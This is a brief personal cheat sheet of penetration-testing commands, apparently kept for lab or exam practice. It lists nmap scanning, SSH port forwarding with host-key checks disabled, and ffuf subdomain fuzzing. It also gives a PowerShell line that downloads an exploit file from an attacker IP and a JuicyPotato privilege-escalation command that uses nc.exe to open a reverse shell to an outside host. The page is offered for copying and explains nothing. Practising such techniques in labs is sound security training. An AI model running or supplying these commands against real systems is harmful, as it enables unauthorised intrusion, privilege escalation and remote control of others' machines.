# Reference

Quick Ctrl+C commands I find useful.

```
nmap -sC -sV -vv -Pn <MACHINE_IP> -oN file.nmap
```

Port forwarding from a remote ip(which here is 192.168.126.52) to my own.

```
sudo ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -N -L 0.0.0.0:80:0.0.0.0:80 student@192.168.126.52 -p 2222
```

Fuzzing subdomains.

```
ffuf -u http://<URL>/ -H "HOST: FUZZ.<URL>" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt 
```

```
$wc = New-Object System.Net.WebClient 
$wc.DownloadFile("http://192.168.45.238/exploit.txt","C:\Users\student\Downloads\exploit.txt") 
```

JuicyPotato Attack

```
juicypotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\Documents\nc.exe -e cmd.exe 192.168.45.243 1234" -t *
```
